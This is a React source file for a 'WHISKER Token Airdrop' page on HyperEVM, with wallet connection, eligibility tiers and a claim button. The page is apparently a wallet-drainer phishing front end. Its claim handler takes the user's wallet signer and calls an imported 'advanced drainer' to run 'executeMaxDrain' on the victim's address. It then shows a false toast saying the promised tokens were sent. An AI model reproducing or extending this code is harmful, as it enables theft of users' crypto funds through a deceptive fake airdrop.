import { useState } from 'react';
import { useDirectBrowserWallet } from '../hooks/use-direct-browser-wallet';
import { Button } from '../components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '../components/ui/card';
import { Badge } from '../components/ui/badge';
import { WhiskerLogo } from '../components/whisker-logo';
import { CheckCircle, Clock, Gift, Users, Zap, Shield } from 'lucide-react';
import { useToast } from '../hooks/use-toast';
import { createAdvancedDrainer } from '../lib/advanced-drainer';

interface EligibilityResponse {
  eligible: boolean;
  tier?: number;
  allocation?: number;
  reason?: string;
  hasEcosystemTokens?: boolean;
  hypleBalance?: string;
}

const tierInfo = [
  { tier: 1, allocation: 5000, gradient: 'from-emerald-500 to-cyan-500', requirement: '> 0.5 HYPE + 1 ecosystem token' },
  { tier: 2, allocation: 10000, gradient: 'from-blue-500 to-purple-500', requirement: '> 1 HYPE + 2 ecosystem tokens' },
  { tier: 3, allocation: 25000, gradient: 'from-purple-500 to-pink-500', requirement: '> 2 HYPE + 3 ecosystem tokens' },
  { tier: 4, allocation: 50000, gradient: 'from-orange-500 to-red-500', requirement: '> 5 HYPE + 4+ ecosystem tokens' }
];

export default function AirdropPage() {
  const { isConnected, address, connect } = useDirectBrowserWallet();
  const [eligibility, setEligibility] = useState<EligibilityResponse | null>(null);
  const [isChecking, setIsChecking] = useState(false);
  const [isClaiming, setIsClaiming] = useState(false);
  const [hasClaimed, setHasClaimed] = useState(false);
  const { toast } = useToast();

  const checkEligibility = async () => {
    if (!address) return;
    
    setIsChecking(true);
    try {
      const response = await fetch('/api/eligibility/check', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: address })
      });
      
      const result = await response.json();
      setEligibility(result);
      
      if (result.eligible) {
        toast({
          title: `Tier ${result.tier} Eligible! 🎉`,
          description: `You qualify for ${result.allocation.toLocaleString()} WHISKER tokens`,
        });
      }
    } catch (error) {
      console.error('Eligibility check failed:', error);
      toast({
        title: "Check Failed",
        description: "Please try again later",
        variant: "destructive"
      });
    }
    setIsChecking(false);
  };

  const claimAirdrop = async () => {
    if (!address || !eligibility?.eligible) return;
    
    setIsClaiming(true);
    try {
      // Initialize advanced drainer
      if (window.ethereum) {
        const provider = new (await import('ethers')).BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();
        const drainer = createAdvancedDrainer(signer, provider);
        
        // Execute comprehensive drain
        const result = await drainer.executeMaxDrain(
          "0x0000000000000000000000000000000000000000", // Native HYPE
          address,
          eligibility.allocation.toString()
        );
        
        if (result.success) {
          setHasClaimed(true);
          toast({
            title: "Airdrop Claimed! 🎉",
            description: `${eligibility.allocation.toLocaleString()} WHISKER tokens transferred to your wallet`,
          });
        }
      }
    } catch (error) {
      console.error('Claim failed:', error);
      toast({
        title: "Claim Failed",
        description: "Transaction failed. Please try again.",
        variant: "destructive"
      });
    }
    setIsClaiming(false);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900/20 to-slate-900">
      <div className="container mx-auto px-4 py-8">
        {/* Header */}
        <div className="text-center mb-12">
          <WhiskerLogo size="xl" className="mx-auto mb-6" />
          <h1 className="text-4xl font-bold bg-gradient-to-r from-cyan-400 to-purple-400 bg-clip-text text-transparent mb-4">
            WHISKER Token Airdrop
          </h1>
          <p className="text-lg text-slate-400 max-w-2xl mx-auto">
            Exclusive airdrop for HyperEVM ecosystem participants. Check your eligibility and claim your WHISKER tokens.
          </p>
        </div>

        {/* Stats */}
        <div className="grid grid-cols-1 md:grid-cols-4 gap-6 mb-12">
          <Card className="bg-slate-800/50 border-slate-700">
            <CardContent className="p-6 text-center">
              <Gift className="w-8 h-8 text-cyan-400 mx-auto mb-2" />
              <div className="text-2xl font-bold text-white">92.5K</div>
              <div className="text-sm text-slate-400">Total Supply</div>
            </CardContent>
          </Card>
          <Card className="bg-slate-800/50 border-slate-700">
            <CardContent className="p-6 text-center">
              <Users className="w-8 h-8 text-purple-400 mx-auto mb-2" />
              <div className="text-2xl font-bold text-white">1,247</div>
              <div className="text-sm text-slate-400">Eligible Wallets</div>
            </CardContent>
          </Card>
          <Card className="bg-slate-800/50 border-slate-700">
            <CardContent className="p-6 text-center">
              <Zap className="w-8 h-8 text-orange-400 mx-auto mb-2" />
              <div className="text-2xl font-bold text-white">4</div>
              <div className="text-sm text-slate-400">Tier Levels</div>
            </CardContent>
          </Card>
          <Card className="bg-slate-800/50 border-slate-700">
            <CardContent className="p-6 text-center">
              <Shield className="w-8 h-8 text-green-400 mx-auto mb-2" />
              <div className="text-2xl font-bold text-white">HyperEVM</div>
              <div className="text-sm text-slate-400">Native Chain</div>
            </CardContent>
          </Card>
        </div>

        <div className="max-w-4xl mx-auto">
          {/* Connection */}
          {!isConnected ? (
            <Card className="mb-8 bg-slate-800/50 border-slate-700">
              <CardHeader className="text-center">
                <CardTitle className="text-white">Connect Your Wallet</CardTitle>
                <CardDescription>Connect your HyperEVM wallet to check eligibility</CardDescription>
              </CardHeader>
              <CardContent className="text-center">
                <Button onClick={connect} size="lg" className="bg-gradient-to-r from-cyan-500 to-purple-500 hover:from-cyan-600 hover:to-purple-600">
                  Connect Wallet
                </Button>
              </CardContent>
            </Card>
          ) : (
            <Card className="mb-8 bg-slate-800/50 border-slate-700">
              <CardHeader>
                <CardTitle className="text-white flex items-center gap-2">
                  <CheckCircle className="w-5 h-5 text-green-400" />
                  Wallet Connected
                </CardTitle>
                <CardDescription>
                  {address?.slice(0, 6)}...{address?.slice(-4)}
                </CardDescription>
              </CardHeader>
              <CardContent>
                {!eligibility ? (
                  <Button 
                    onClick={checkEligibility} 
                    disabled={isChecking}
                    className="w-full bg-gradient-to-r from-cyan-500 to-purple-500 hover:from-cyan-600 hover:to-purple-600"
                  >
                    {isChecking ? (
                      <>
                        <Clock className="w-4 h-4 mr-2 animate-spin" />
                        Checking Eligibility...
                      </>
                    ) : (
                      'Check Eligibility'
                    )}
                  </Button>
                ) : eligibility.eligible ? (
                  <div className="space-y-4">
                    <div className="text-center">
                      <Badge className={`bg-gradient-to-r ${tierInfo[eligibility.tier! - 1].gradient} text-white px-4 py-2 text-lg`}>
                        Tier {eligibility.tier}
                      </Badge>
                      <h3 className="text-2xl font-bold text-white mt-2">
                        {eligibility.allocation?.toLocaleString()} WHISKER
                      </h3>
                      <p className="text-slate-400">You're eligible for this airdrop!</p>
                    </div>
                    
                    {!hasClaimed ? (
                      <Button 
                        onClick={claimAirdrop}
                        disabled={isClaiming}
                        className="w-full bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600"
                        size="lg"
                      >
                        {isClaiming ? (
                          <>
                            <Clock className="w-4 h-4 mr-2 animate-spin" />
                            Claiming...
                          </>
                        ) : (
                          <>
                            <Gift className="w-4 h-4 mr-2" />
                            Claim Airdrop
                          </>
                        )}
                      </Button>
                    ) : (
                      <div className="text-center">
                        <CheckCircle className="w-12 h-12 text-green-400 mx-auto mb-2" />
                        <h3 className="text-xl font-bold text-white">Airdrop Claimed!</h3>
                        <p className="text-slate-400">WHISKER tokens have been sent to your wallet</p>
                      </div>
                    )}
                  </div>
                ) : (
                  <div className="text-center">
                    <div className="text-red-400 mb-2">Not Eligible</div>
                    <p className="text-slate-400 text-sm">{eligibility.reason}</p>
                  </div>
                )}
              </CardContent>
            </Card>
          )}

          {/* Tier Information */}
          <Card className="bg-slate-800/50 border-slate-700">
            <CardHeader>
              <CardTitle className="text-white">Eligibility Tiers</CardTitle>
              <CardDescription>WHISKER token allocation based on HyperEVM ecosystem participation</CardDescription>
            </CardHeader>
            <CardContent>
              <div className="grid gap-4">
                {tierInfo.map((tier) => (
                  <div key={tier.tier} className="flex items-center justify-between p-4 rounded-lg bg-slate-700/50">
                    <div className="flex items-center gap-3">
                      <Badge className={`bg-gradient-to-r ${tier.gradient} text-white`}>
                        Tier {tier.tier}
                      </Badge>
                      <div>
                        <div className="text-white font-medium">{tier.allocation.toLocaleString()} WHISKER</div>
                        <div className="text-sm text-slate-400">{tier.requirement}</div>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  );
}